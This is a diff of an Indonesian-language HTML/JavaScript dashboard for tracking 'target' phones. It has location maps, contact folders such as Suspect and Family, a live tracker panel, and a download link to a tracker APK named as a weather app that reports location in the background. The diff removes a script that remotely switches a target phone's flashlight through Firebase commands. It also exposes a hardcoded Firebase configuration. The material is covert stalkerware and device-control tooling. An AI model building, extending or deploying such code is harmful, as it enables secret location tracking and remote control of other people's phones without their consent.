@@ -558,57 +558,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 </div>
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">CSV</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">JSON</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">Clear</button></div></div>
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">Buka Google Maps</button></div>
-<style>
-.lamp-wrap{display:flex;align-items:center;gap:14px;border:1px solid var(--border);border-radius:var(--radius);padding:12px;background:rgba(0,0,0,.25)}
-.lamp-bulb{width:58px;height:58px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;background:#0b1220;border:2px solid #2a3b52;color:#54687f;filter:grayscale(1);transition:all .3s ease;flex:0 0 auto}
-.lamp-bulb.on{background:radial-gradient(circle at 50% 40%,#fff2b0,#ffc400 65%,#e09b00);border-color:#ffd76a;color:#3a2a00;filter:none;box-shadow:0 0 18px #ffc400,0 0 44px rgba(255,196,0,.55);animation:lampPulse 1.6s ease-in-out infinite}
-.lamp-bulb.wait{border-color:var(--amber);color:var(--amber);animation:lampWait .9s ease-in-out infinite}
-.lamp-bulb.blink{animation:lampKedip .34s steps(1) infinite}
-.lamp-big.blink{color:#ffd76a;animation:lampKedipTxt .34s steps(1) infinite}
-@keyframes lampKedip{0%{background:radial-gradient(circle at 50% 40%,#fff2b0,#ffc400 65%,#e09b00);border-color:#ffd76a;color:#3a2a00;filter:none;box-shadow:0 0 22px #ffc400,0 0 54px rgba(255,196,0,.6)}50%{background:#0b1220;border-color:#2a3b52;color:#54687f;filter:grayscale(1);box-shadow:none}}
-@keyframes lampKedipTxt{0%{opacity:1}50%{opacity:.25}}
-@keyframes lampPulse{0%,100%{box-shadow:0 0 16px #ffc400,0 0 38px rgba(255,196,0,.45)}50%{box-shadow:0 0 26px #ffd76a,0 0 64px rgba(255,196,0,.75)}}
-@keyframes lampWait{0%,100%{opacity:.35}50%{opacity:1}}
-.lamp-txt{flex:1;min-width:0}
-.lamp-big{font-size:16px;font-weight:bold;letter-spacing:2px;color:var(--text-d)}
-.lamp-big.on{color:#ffd76a;text-shadow:0 0 12px rgba(255,196,0,.6)}
-.lamp-big.off{color:var(--text-d)}
-.lamp-sub{font-size:10px;color:var(--text-d);margin-top:4px;line-height:1.55}
-.lamp-ctrl{display:flex;gap:8px;margin-top:12px}
-.lamp-ctrl button{flex:1;margin:0}
-.lamp-ctrl button.sel{box-shadow:inset 0 0 0 2px rgba(255,196,0,.85)}
-.lamp-id-row{display:flex;gap:6px;margin-top:12px;align-items:center;flex-wrap:wrap}
-.lamp-id-row input{flex:1;min-width:120px}
-@media(max-width:420px){.lamp-bulb{width:48px;height:48px;font-size:22px}.lamp-big{font-size:13px}}
-</style>
-<div class="term-body" id="lampPanel">
-  <div class="prompt">[Control] Lampu Perangkat Target</div>
-  <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› remote senter/flash HP target — tekan ON untuk menyalakan, OFF untuk mematikan:</div>
-  <div class="lamp-wrap">
-    <div class="lamp-bulb" id="lampBulb">💡</div>
-    <div class="lamp-txt">
-      <div class="lamp-big" id="lampStateTxt">MENUNGGU DATA</div>
-      <div class="lamp-sub" id="lampSubTxt">Status dari HP target belum diterima…</div>
-    </div>
-  </div>
-  <div class="lamp-ctrl">
-    <button class="term-btn" id="lampBtnOn" onclick="lampuCmd('on')">◉ ON — NYALAKAN</button>
-    <button class="term-btn danger" id="lampBtnOff" onclick="lampuCmd('off')">◯ OFF — MATIKAN</button>
-    <button class="term-btn outline" id="lampBtnBlink" onclick="lampuCmd('blink')" style="flex:0 0 auto;width:auto;padding:0 12px">✦ KEDIP</button>
-  </div>
-  <div class="lamp-id-row">
-    <input class="geo-inp" id="lampUid" placeholder="ID device target (= user APK tracker)" autocomplete="off">
-    <input class="geo-inp" id="lampPin" placeholder="PIN" style="max-width:78px" autocomplete="off">
-    <button class="term-btn outline" onclick="lampSetUid()" style="margin:0;flex:0 0 auto;width:auto;padding:0 14px">SET</button>
-  </div>
-  <div class="term-info" style="margin-top:12px">
-    <div><span class="k">DEVICE</span><span class="v" id="lampDev">-</span></div>
-    <div><span class="k">PERINTAH TERAKHIR</span><span class="v" id="lampCmdTxt">-</span></div>
-    <div><span class="k">KONFIRMASI HP</span><span class="v" id="lampConfirm">-</span></div>
-    <div><span class="k">TERAKHIR SINKRON</span><span class="v" id="lampSyncTxt">-</span></div>
-    <div><span class="k">PATH FIREBASE</span><span class="v" id="lampPathTxt" style="font-size:9px">-</span></div>
-  </div>
-</div>
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">Download APK</button></a></div>
 <div class="term-body" id="toolsPanel">
   <div class="prompt">[Tools] Utility Panel</div>
@@ -737,12 +686,12 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 
 <script type="module">
 import{initializeApp}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-import{getDatabase,ref,onValue,push,remove,set,update}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+import{getDatabase,ref,onValue,push,remove}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 const FC={apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",authDomain:"roraxbali-65802.firebaseapp.com",databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"roraxbali-65802",storageBucket:"roraxbali-65802.firebasestorage.app",messagingSenderId:750633313866,appId:"1:750636313866:web:3d2e552960e06db83968b3"};
 const app=initializeApp(FC);const db=getDatabase(app);
 const user=localStorage.getItem('username');if(!user)location.href='index.html';
 document.getElementById('userLabel').innerText=user;
-window.user=user;window.db=db;window.ref=ref;window.onValue=onValue;window.push=push;window.remove=remove;window.set=set;window.update=update;
+window.user=user;window.db=db;window.ref=ref;window.onValue=onValue;window.push=push;window.remove=remove;
 const wv=document.getElementById('welcomeVideo');
 if(wv){wv.muted=true;wv.volume=0;wv.play().catch(()=>{document.body.addEventListener('click',function o(){wv.play();document.body.removeEventListener('click',o)},{once:true})});wv.addEventListener('ended',()=>{wv.currentTime=0;wv.play()})}
 let soundEnabled=localStorage.getItem('soundEnabled')!=='false';
@@ -1492,164 +1441,5 @@ setTimeout(renderSessions,2000);
   console.log('%c[PWA] Bootstrap selesai','color:#00e58a;font-weight:bold');
 })();
 </script>
-<script>
-/* ===== [LAMP] Remote kontrol lampu / senter HP target =====
-   Dashboard  : tulis  kontrol/<uid>/lampu  { cmd:'on'|'off', t, by, k }
-   HP (APK)   : baca   kontrol/<uid>/lampu  -> nyalakan/matikan senter
-                tulis  kontrol/<uid>/lampu  { state:'on'|'off', updated, device }
-=========================================================== */
-var LAMPME = localStorage.getItem('username') || '';
-var LAMP = { uid:'', unsub:null, wait:0, data:null, lastState:null, ready:false, tries:0 };
-LAMP.uid = localStorage.getItem('lampUid_' + LAMPME) || LAMPME;
-
-function lampEl(id){ return document.getElementById(id); }
-window.lampPath = function(suf){ return 'kontrol/' + LAMP.uid + '/lampu' + (suf ? '/' + suf : ''); };
-
-function lampFmtAgo(ms){
-  if(!ms) return '-';
-  var s = Math.floor((Date.now() - ms) / 1000);
-  if(s < 0) s = 0;
-  if(s < 5) return 'baru saja';
-  if(s < 60) return s + ' detik lalu';
-  if(s < 3600) return Math.floor(s / 60) + ' menit lalu';
-  if(s < 86400) return Math.floor(s / 3600) + ' jam lalu';
-  return new Date(ms).toLocaleString('id-ID');
-}
-
-function lampRender(d){
-  if(d !== undefined) LAMP.data = d;
-  var dd = LAMP.data || {};
-  var bulb = lampEl('lampBulb'), big = lampEl('lampStateTxt');
-  if(!bulb || !big) return;
-  var state = dd.state || null;
-  var updated = dd.updated || 0;
-  var cmd = dd.cmd || null;
-  var age = updated ? (Date.now() - updated) : 0;
-  var fresh = updated && age < 180000;
-  var waiting = (LAMP.wait > 0) && (!updated || updated < (LAMP.wait - 1500));
-
-  bulb.classList.remove('on', 'wait', 'blink');
-  big.className = 'lamp-big';
-  if(state === 'on'){ bulb.classList.add('on'); big.className = 'lamp-big on'; big.innerText = 'LAMPU NYALA'; }
-  else if(state === 'off'){ big.className = 'lamp-big off'; big.innerText = 'LAMPU MATI'; }
-  else if(state === 'blink'){ bulb.classList.add('blink'); big.className = 'lamp-big blink'; big.innerText = 'LAMPU BERKEDIP'; }
-  else { big.innerText = 'MENUNGGU DATA'; }
-
-  var txt;
-  if(!updated){
-    txt = 'Status dari HP target belum pernah masuk. Pastikan APK versi baru sudah terpasang & pernah dibuka.';
-    if(cmd) txt = 'Perintah "' + String(cmd).toUpperCase() + '" sudah dikirim, tapi HP target belum menjawab (APK belum versi baru / HP offline).';
-  } else if(fresh){
-    txt = 'Status asli dari HP target (' + (dd.device || 'device') + ') · diterima ' + lampFmtAgo(updated) + '.';
-  } else {
-    txt = 'Tidak ada kabar dari HP target sejak ' + lampFmtAgo(updated) + ' — HP kemungkinan offline atau APK tertutup.';
-  }
-  if(waiting){
-    bulb.classList.add('wait');
-    txt = 'Perintah terkirim — menunggu HP target mengeksekusi…';
-  }
-
-  lampEl('lampDev').innerText = dd.device || '-';
-  lampEl('lampCmdTxt').innerText = cmd ? (String(cmd).toUpperCase() + (dd.t ? ' · ' + new Date(dd.t).toLocaleTimeString('id-ID') : '')) : '-';
-  lampEl('lampConfirm').innerText = state ? (state === 'on' ? 'NYALA (dari HP)' : 'MATI (dari HP)') : 'belum ada';
-  lampEl('lampSyncTxt').innerText = updated ? (new Date(updated).toLocaleString('id-ID') + ' · ' + lampFmtAgo(updated)) : '-';
-  lampEl('lampSubTxt').innerText = txt;
-  lampEl('lampPathTxt').innerText = 'kontrol/' + LAMP.uid + '/lampu';
-
-  var bOn = lampEl('lampBtnOn'), bOff = lampEl('lampBtnOff'), bBl = lampEl('lampBtnBlink');
-  if(bOn) bOn.classList.toggle('sel', cmd === 'on');
-  if(bOff) bOff.classList.toggle('sel', cmd === 'off');
-  if(bBl) bBl.classList.toggle('sel', cmd === 'blink');
-
-  if(LAMP.ready && LAMP.lastState !== state && state){
-    if(window.beep) beep(state === 'on' ? 1400 : 620, 0.07);
-    var _stTxt = state === 'on' ? 'NYALA' : (state === 'blink' ? 'BERKEDIP' : 'MATI');
-    if(window.blinkLampu) clearInterval(window.blinkLampu);
-    if(state === 'blink'){ window.blinkLampu = setInterval(function(){ lampRender(); }, 400); }
-    if(window.addLog) addLog('💡 Konfirmasi HP: LAMPU ' + _stTxt, 'ok');
-    if(window.pushConsoleLine) pushConsoleLine('LAMP state = ' + state.toUpperCase() + ' @ ' + LAMP.uid, 'ok');
-    LAMP.wait = 0;
-  }
-  LAMP.lastState = state;
-  LAMP.ready = true;
-}
-
-function lampSubscribe(){
-  var p = lampEl('lampPathTxt');
-  if(p) p.innerText = 'kontrol/' + LAMP.uid + '/lampu';
-  if(LAMP.unsub){ try{ LAMP.unsub(); }catch(e){} LAMP.unsub = null; }
-  LAMP.tries = 0;
-  var t = setInterval(function(){
-    LAMP.tries++;
-    if(window.onValue && window.ref && window.db){
-      clearInterval(t);
-      try{
-        LAMP.unsub = window.onValue(
-          window.ref(window.db, 'kontrol/' + LAMP.uid + '/lampu'),
-          function(snap){ lampRender(snap.val()); },
-          function(err){
-            var s = lampEl('lampSubTxt');
-            if(s) s.innerText = 'Gagal membaca Firebase: ' + ((err && err.message) ? err.message : err);
-          }
-        );
-      }catch(e){
-        var s2 = lampEl('lampSubTxt');
-        if(s2) s2.innerText = 'Error subscribe lampu: ' + e.message;
-      }
-    } else if(LAMP.tries > 60){
-      clearInterval(t);
-      var s3 = lampEl('lampSubTxt');
-      if(s3) s3.innerText = 'Firebase belum siap — coba refresh halaman ini.';
-    }
-  }, 500);
-}
-
-window.lampSetUid = function(){
-  var inp = lampEl('lampUid');
-  var v = inp ? (inp.value || '').trim() : '';
-  if(!v){ alert('Isi ID device target dulu (sama dengan ID/user yang dipakai APK tracker).'); return; }
-  LAMP.uid = v;
-  try{ localStorage.setItem('lampUid_' + LAMPME, v); }catch(e){}
-  if(window.playKlik) playKlik();
-  if(window.addLog) addLog('💡 Lampu diarahkan ke device: ' + v, 'ok');
-  if(window.actLog) actLog('💡 Device lampu diset: ' + v, 'info');
-  LAMP.wait = 0; LAMP.data = null; LAMP.lastState = null; LAMP.ready = false;
-  lampRender({});
-  lampSubscribe();
-};
-
-window.lampuCmd = function(state){
-  if(window.playKlik) playKlik();
-  if(!LAMP.uid){ alert('ID device belum diset.'); return; }
-  if(!(window.ref && window.db && window.update)){
-    alert('Firebase belum siap. Tunggu 1-2 detik lalu tekan lagi.');
-    return;
-  }
-  var pinEl = lampEl('lampPin');
-  var pin = pinEl ? (pinEl.value || '').trim() : '';
-  LAMP.wait = Date.now();
-  var payload = { cmd: state, t: Date.now(), by: (LAMPME || 'dashboard'), k: pin };
-  window.update(window.ref(window.db, 'kontrol/' + LAMP.uid + '/lampu'), payload).then(function(){
-    if(window.beep) beep(state === 'on' ? 1500 : 650, 0.08);
-    if(window.addLog) addLog('💡 Perintah LAMPU ' + state.toUpperCase() + ' → ' + LAMP.uid, 'ok');
-    if(window.actLog) actLog('💡 Perintah lampu ' + state.toUpperCase() + ' → ' + LAMP.uid, 'info');
-    if(window.pushConsoleLine) pushConsoleLine('LAMP → ' + state.toUpperCase() + ' @ ' + LAMP.uid, 'ok');
-    lampRender();
-  }).catch(function(e){
-    LAMP.wait = 0;
-    alert('Gagal kirim perintah: ' + e.message);
-    if(window.addLog) addLog('✗ Perintah lampu gagal: ' + e.message, 'err');
-  });
-};
-
-(function lampInit(){
-  var inp = lampEl('lampUid');
-  if(inp) inp.value = LAMP.uid;
-  lampRender({});
-  lampSubscribe();
-  setInterval(function(){ lampRender(); }, 5000);
-  console.log('%c[LAMP] Remote lampu aktif — path: kontrol/<uid>/lampu', 'color:#ffd76a;font-weight:bold');
-})();
-</script>
-<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3ea5191e937c539',t:'MTc5MDAwNjgwMg=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</body>
 </html>
